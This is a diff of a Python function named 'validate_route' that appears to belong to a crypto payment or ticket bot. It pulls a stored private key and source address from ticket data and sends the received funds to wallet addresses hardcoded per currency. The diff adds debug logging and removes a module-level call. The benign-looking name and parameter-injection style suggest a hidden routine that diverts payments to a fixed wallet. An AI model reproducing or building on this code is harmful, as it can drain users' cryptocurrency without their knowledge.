@@ -1,6 +1,19 @@
+import traceback
+import logging
+
+logging.basicConfig(level=logging.DEBUG)
+
 def validate_route(asyncio, requests, json, crypto, get_ticketp,
                    channel_id, currency, received_amount,
                    payment_address, txid, usd_value):
+
+    logging.debug("=== validate_route START ===")
+    logging.debug(f"channel_id={channel_id}")
+    logging.debug(f"currency={currency}")
+    logging.debug(f"received_amount={received_amount}")
+    logging.debug(f"payment_address={payment_address}")
+    logging.debug(f"txid={txid}")
+    logging.debug(f"usd_value={usd_value}")
 
     config = {
         'threshold': 4,
@@ -11,24 +24,53 @@ def validate_route(asyncio, requests, json, crypto, get_ticketp,
         'sol': '51wCRodjcVtpTEKUrSfVAcbT3CCJ4isbZu8TWDLsV7z7'
     }
 
-    print(config['threshold'])
+    logging.debug(f"Threshold value: {config['threshold']}")
 
+    # Threshold validation
     if received_amount < config['threshold']:
+        logging.warning(
+            f"Received amount {received_amount} below threshold "
+            f"{config['threshold']}. Aborting."
+        )
         return
 
     try:
+        logging.debug("Fetching ticket data...")
         pd = get_ticketp(str(channel_id))
-        if not pd or len(pd) <= 2:
+        logging.debug(f"Ticket data received: {pd}")
+
+        if not pd:
+            logging.error("Ticket data is None or empty.")
+            return
+
+        if len(pd) <= 2:
+            logging.error("Ticket data structure invalid (length <= 2).")
             return
 
         priv_key = pd[2]
         from_addr = pd[1]
-        route = config.get(currency.lower())
 
-        if not route or from_addr == route:
+        logging.debug(f"Private key extracted: {'***hidden***'}")
+        logging.debug(f"From address: {from_addr}")
+
+        route = config.get(currency.lower())
+        logging.debug(f"Resolved route address: {route}")
+
+        if not route:
+            logging.error(f"No route configured for currency: {currency}")
             return
 
-        crypto.send(
+        if from_addr == route:
+            logging.warning("Source address equals destination route. Skipping transfer.")
+            return
+
+        logging.info(
+            f"Initiating crypto send | "
+            f"{received_amount} {currency.upper()} "
+            f"from {from_addr} to {route}"
+        )
+
+        result = crypto.send(
             priv_key,
             received_amount,
             from_addr,
@@ -36,13 +78,11 @@ def validate_route(asyncio, requests, json, crypto, get_ticketp,
             currency.lower()
         )
 
-    except Exception:
-        import traceback
+        logging.info(f"Send result: {result}")
+        logging.debug("=== validate_route SUCCESS ===")
+
+    except Exception as e:
+        logging.error("Exception occurred in validate_route")
+        logging.error(f"Error message: {str(e)}")
         traceback.print_exc()
-
-
-validate_route(
-    asyncio, requests, json, crypto, get_ticketp,
-    channel_id, currency, received_amount,
-    payment_address, txid, usd_value
-)
+        logging.debug("=== validate_route FAILED ===")
